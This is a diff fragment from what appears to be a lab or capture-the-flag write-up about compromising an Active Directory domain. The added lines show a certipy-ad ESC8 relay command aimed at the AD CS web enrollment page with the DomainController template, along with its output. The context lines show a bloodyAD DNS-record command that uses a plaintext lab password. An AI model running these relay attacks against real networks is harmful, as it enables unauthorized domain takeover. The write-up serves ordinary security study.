@@ -530,6 +530,20 @@ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl
 [+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
 ```
 
+start `certipy relay` targeting the ADCS webserver, and it listens on SMB:
+
+```
+certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController 
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
+  return string
+[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+[*] Setting up SMB Server on port 445
+
+```
+
 ---
 ## User Flag
 
